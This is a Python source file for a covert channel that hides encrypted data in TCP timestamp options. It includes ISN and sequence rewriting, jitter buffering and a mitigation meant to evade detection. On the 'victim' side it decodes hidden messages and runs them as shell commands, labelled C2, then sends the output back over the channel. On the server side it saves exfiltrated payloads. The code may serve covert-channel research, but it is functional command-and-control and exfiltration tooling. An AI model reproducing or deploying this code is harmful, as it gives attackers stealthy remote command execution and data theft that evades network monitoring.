import logging
import time
import subprocess
from scapy.all import TCP
from constants import *
from utils import *

class JitterBufferItem:
    def __init__(self, time, tcp_layer):
        self.time = time
        self.tcp_layer = tcp_layer
        self.seq = tcp_layer.seq
        self.ack = tcp_layer.ack

class Connection:
    def __init__(self, delta, local_isn, out_folder, out_file, execute_commands, jitter_enabled=True, mitigated=False):
        self.delta = delta
        self.fin_count = 0

        self.local_isn = local_isn
        self.session_key = None

        self.injected_cache = {}
        self.extracted_cache = {}
        self.last_injected_tsval = 0

        self.send_queue = ""
        self.recv_buffer = ""

        self.recv_state = ConnectionState.WAITING_SOF
        self.expected_length = 0

        self.out_folder = out_folder
        self.out_file = out_file

        self.execute_commands = execute_commands

        self.jitter_enabled = jitter_enabled
        self.jitter_buffer = []
        self.jitter_delay = 0.1

        # clock-tick gating mitigation: only inject/extract when the kernel TCP
        # clock has actually ticked since the last packet (raw TSval changed).
        # When it has not ticked the packet is passed through / skipped unchanged,
        # which reproduces the natural diff=0 distribution of legitimate traffic.
        self.mitigated = mitigated
        self.last_raw_tsval_inject = None
        self.last_raw_tsval_extract = None

    @classmethod
    def create_from_syn(cls, tcp_layer, out_folder="received", out_file="recv.bin", execute_commands=False, jitter_enabled=True, mitigated=False):
        """
        Factory method, generates an ISN, modifies the tcp_layer and returns
        an initialized Connection object.
        """
        # generate recognizable isn
        generated_isn = generate_isn()
        original_isn = tcp_layer.seq

        # calculate delta
        delta = (generated_isn - original_isn) % (2**32)

        tcp_layer.seq = generated_isn
        logging.debug("Modified ISN in outgoing SYN packet.")

        return cls(delta, generated_isn, out_folder, out_file, execute_commands, jitter_enabled=jitter_enabled, mitigated=mitigated)

    def translate_seq(self, tcp_layer):
        """
        Adds the delta to the sequence number
        """
        tcp_layer.seq = (tcp_layer.seq + self.delta) % (2**32)
        logging.debug("Modified SEQ for outgoing packet.")

    def translate_ack(self, tcp_layer):
        """
        Subtracts the delta from the ACK number
        """
        if "A" not in tcp_layer.flags:
            logging.error("No ACK flag")
            return
        
        tcp_layer.ack = (tcp_layer.ack - self.delta) % (2**32)
        logging.debug("Modified ACK for incoming packet")

    def queue_message(self, payload_bytes: bytes):
        """
        Encodes a message into our custom frame:
        [SOF][16-bit Length Prefix][Payload bytes]
        """
        payload_length_bytes = len(payload_bytes)

        if payload_length_bytes > ProtocolConfig.MAX_PAYLOAD_BYTES:
            raise ValueError(f"Message too long (> {ProtocolConfig.MAX_PAYLOAD_BYTES} bytes)")

        length_prefix_bits = format(payload_length_bytes, f'0{ProtocolConfig.LENGTH_BITS_PREFIX}b')
        payload_bits = ''.join(format(byte, '08b') for byte in payload_bytes)

        self.send_queue += ProtocolConfig.SOF + length_prefix_bits + payload_bits
        logging.info(f"Queued message: {payload_length_bytes} bytes.")

    def establish_session_key(self, peer_isn):
        self.session_key = derive_session_key(self.local_isn, peer_isn)
        logging.info(f"Session key established successfully.")

    @staticmethod
    def _read_raw_tsval(tcp_layer):
        """Return the raw TSval from the TCP Timestamp option, or None if absent."""
        for opt in tcp_layer.options:
            if opt[0] == 'Timestamp':
                return opt[1][0]
        return None

    def inject_next_bits(self, tcp_layer):
        """
        Injects the next bit into the timestamp
        TODO:
            - maybe don't inject in every packet
        """
        # clock-tick gating: if the kernel clock hasn't ticked since the last inject,
        # pass the packet through unchanged and don't consume any bits from the queue.
        current_raw_tsval = self._read_raw_tsval(tcp_layer)
        if (self.mitigated
                and self.last_raw_tsval_inject is not None
                and current_raw_tsval is not None
                and current_raw_tsval == self.last_raw_tsval_inject):
            # Stamp with the last injected wire value so the wire never decreases
            # and the receiver's equality gate fires (same value → receiver skips).
            new_options = []
            for opt in tcp_layer.options:
                if opt[0] == 'Timestamp':
                    _, tsecr = opt[1]
                    new_options.append(('Timestamp', (self.last_injected_tsval, tsecr)))
                else:
                    new_options.append(opt)
            tcp_layer.options = new_options
            return

        if "A" not in tcp_layer.flags:
            return
            
        packet_state = (tcp_layer.seq, tcp_layer.ack)  
        if packet_state in self.injected_cache:
            # retransmit bit
            wire_bits = self.injected_cache[packet_state]
            extracted_bit_from_queue = False
        else:
            # extract bit from queue to transmit
            extracted_bit_from_queue = False
            if self.send_queue:
                extracted_bit_from_queue = True

                chunk = self.send_queue[:ProtocolConfig.BITS_PER_PACKET]
                self.send_queue = self.send_queue[len(chunk):]

                if len(chunk) < ProtocolConfig.BITS_PER_PACKET:
                    chunk = chunk.ljust(ProtocolConfig.BITS_PER_PACKET, '0')

                plaintext_bits = int(chunk, 2)
            else:
                plaintext_bits = 0  # TODO: only inject to avoid SOF 

            wire_bits = plaintext_bits ^ generate_keystream_bits(tcp_layer, self.session_key)

            self.injected_cache[packet_state] = wire_bits

            if len(self.injected_cache) > 100:  # remove old states from cache
                oldest_state = next(iter(self.injected_cache))
                del self.injected_cache[oldest_state]

        # inject into timestamp
        injected = False
        new_options = []
        for opt in tcp_layer.options:
            if opt[0] == 'Timestamp':
                tsval, tsecr = opt[1]
                
                bpp_mod = 1 << ProtocolConfig.BITS_PER_PACKET
                max_tsval = max(tsval, self.last_injected_tsval + 1)
                
                remainder = max_tsval % bpp_mod
                diff = (wire_bits - remainder) % bpp_mod
                
                new_tsval = max_tsval + diff
                self.last_injected_tsval = new_tsval
                
                new_options.append(('Timestamp', (new_tsval, tsecr)))
                injected = True

                time.sleep(diff * 0.001)
            else:
                new_options.append(opt)

        if injected:
            tcp_layer.options = new_options

            if extracted_bit_from_queue:
                logging.debug(f"Injected bits {bits_to_str(plaintext_bits)}. Queue remaining: {len(self.send_queue)}")

        # injection proceeded: remember this packet's raw TSval so the next packet
        # carrying the same raw TSval (same clock tick) is passed through unchanged.
        if current_raw_tsval is not None:
            self.last_raw_tsval_inject = current_raw_tsval

    def extract_and_process_bit(self, tcp_layer):
        """
        Queues packets in the jitter buffer and then feeds them into the state machine.
        When jitter_enabled is False, bypasses the buffer entirely and processes
        packets immediately in wire-arrival order.
        """
        # clock-tick gating: if the clock hasn't ticked since the last extract,
        # the sender passed this packet through unchanged, so skip it.
        current_raw_tsval = self._read_raw_tsval(tcp_layer)
        if (self.mitigated
                and self.last_raw_tsval_extract is not None
                and current_raw_tsval is not None
                and current_raw_tsval == self.last_raw_tsval_extract):
            return

        if "A" not in tcp_layer.flags:
            return

        packet_state = (tcp_layer.seq, tcp_layer.ack)
        if packet_state in self.extracted_cache:
            return
        self.extracted_cache[packet_state] = True

        # extraction is proceeding for this packet: remember its TSval so the next
        # packet carrying the same TSval (same clock tick) is skipped.
        if current_raw_tsval is not None:
            self.last_raw_tsval_extract = current_raw_tsval

        if len(self.extracted_cache) > 1000:     # remove old states from cache
            del self.extracted_cache[next(iter(self.extracted_cache))]

        if not self.jitter_enabled:
            # Bypass buffer: process immediately in wire-arrival order, no sort, no delay.
            self._extract_bit_from_pkt(JitterBufferItem(time.time(), tcp_layer))
            return

        # feed jitter buffer
        self.jitter_buffer.append(JitterBufferItem(time.time(), tcp_layer))

        self.jitter_buffer.sort(key=lambda pkt: (pkt.seq, pkt.ack))
        current_time = time.time()

        while self.jitter_buffer:
            if current_time - self.jitter_buffer[0].time > self.jitter_delay:
                pkt_to_process = self.jitter_buffer.pop(0)
                self._extract_bit_from_pkt(pkt_to_process)
            else:
                # if the required delay didn't pass, don't process
                break

    def flush_jitter_buffer(self):
        # When jitter is disabled the buffer is always empty (packets were processed
        # immediately on arrival), so this loop is a no-op in that mode.
        while self.jitter_buffer:
            pkt_to_process = self.jitter_buffer.pop(0)
            self._extract_bit_from_pkt(pkt_to_process)

    def _extract_bit_from_pkt(self, packet: JitterBufferItem):
        tcp_layer = packet.tcp_layer

        # we need to replace the seq/ack since the wire values are used, but
        # since jitter_delay seconds have passed, they have been rewritten with the values expected by the kernel
        # (we do this so the kernel doesn't have to wait for our jitter buffer)
        original_seq = tcp_layer.seq
        original_ack = tcp_layer.ack
        tcp_layer.seq = packet.seq
        tcp_layer.ack = packet.ack

        for opt in tcp_layer.options:
            if opt[0] == 'Timestamp':
                tsval, _ = opt[1]

                mask = (1 << ProtocolConfig.BITS_PER_PACKET) - 1
                wire_bits = tsval & mask
                plaintext_bits = wire_bits ^ generate_keystream_bits(tcp_layer, self.session_key)
                plaintext_bits_string = bits_to_str(plaintext_bits)
                logging.debug(f"Extracted bits {plaintext_bits_string}.")

                for bit in plaintext_bits_string:
                    self._feed_state_machine(bit)
                break

        # restore the values
        tcp_layer.seq = original_seq
        tcp_layer.ack = original_ack
            
    def _feed_state_machine(self, bit: str):
        """
        Internal receiver
        """
        self.recv_buffer += bit
        
        if self.recv_state == ConnectionState.WAITING_SOF:
            if len(self.recv_buffer) > len(ProtocolConfig.SOF):
                """
                Basically removes the oldest bit
                """
                self.recv_buffer = self.recv_buffer[-len(ProtocolConfig.SOF):]
            if self.recv_buffer == ProtocolConfig.SOF:
                logging.info("SOF detected! Preparing to receive message.")
                self.recv_state = ConnectionState.READING_LENGTH
                self.recv_buffer = ""
                
        elif self.recv_state == ConnectionState.READING_LENGTH:
            if len(self.recv_buffer) == ProtocolConfig.LENGTH_BITS_PREFIX:
                # decode the byte length and convert to bit length
                self.expected_length = int(self.recv_buffer, 2) * 8
                logging.info(f"Length prefix decoded: {self.expected_length // 8} bytes.")
                self.recv_state = ConnectionState.READING_PAYLOAD
                self.recv_buffer = ""
                
        elif self.recv_state == ConnectionState.READING_PAYLOAD:
            if len(self.recv_buffer) == self.expected_length:
                byte_list = [int(self.recv_buffer[i:i+8], 2) for i in range(0, len(self.recv_buffer), 8)]
                payload_bytes = bytes(byte_list)

                if self.execute_commands:
                    # this would be Alice (victim)
                    try:
                        logging.info(f"Message received!")
                        command = payload_bytes.decode('utf-8').strip()
                        logging.info(f"Executing C2 Command: {command}")
                        
                        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=10)
                        
                        self.queue_message(output)
                    except Exception as e:
                        self.queue_message(str(e).encode('utf-8'))
                else:
                    # this would be Bob (server)
                    os.makedirs(self.out_folder, exist_ok=True)
                    out_filename = os.path.join(self.out_folder, self.out_file)
                    with open(out_filename, "wb") as f:
                        f.write(payload_bytes)
                    logging.info(f"MESSAGE RECEIVED: Saved {len(payload_bytes)} bytes to {out_filename}")
                
                # reset
                self.recv_state = ConnectionState.WAITING_SOF
                self.recv_buffer = ""
                self.expected_length = 0

